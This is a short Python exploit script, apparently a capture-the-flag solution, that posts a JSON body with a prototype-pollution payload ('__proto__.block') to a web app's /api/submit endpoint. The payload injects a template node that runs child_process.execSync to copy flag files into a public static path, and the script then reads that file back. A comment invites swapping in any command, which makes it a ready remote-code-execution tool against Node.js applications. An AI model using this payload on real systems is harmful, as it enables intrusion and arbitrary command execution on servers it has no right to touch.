import requests

TARGET_URL = '' # please enter info

r = requests.post(TARGET_URL + '/api/submit', json = {
    "artist.name":"Westaway",
    "__proto__.block": {
        "type": "Text", 
      # based on your objective, you can change the commands running on this line
        "line": "process.mainModule.require('child_process').execSync(`cat flag* > /app/static/js/out`)"
    }
})

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/js/out').text)
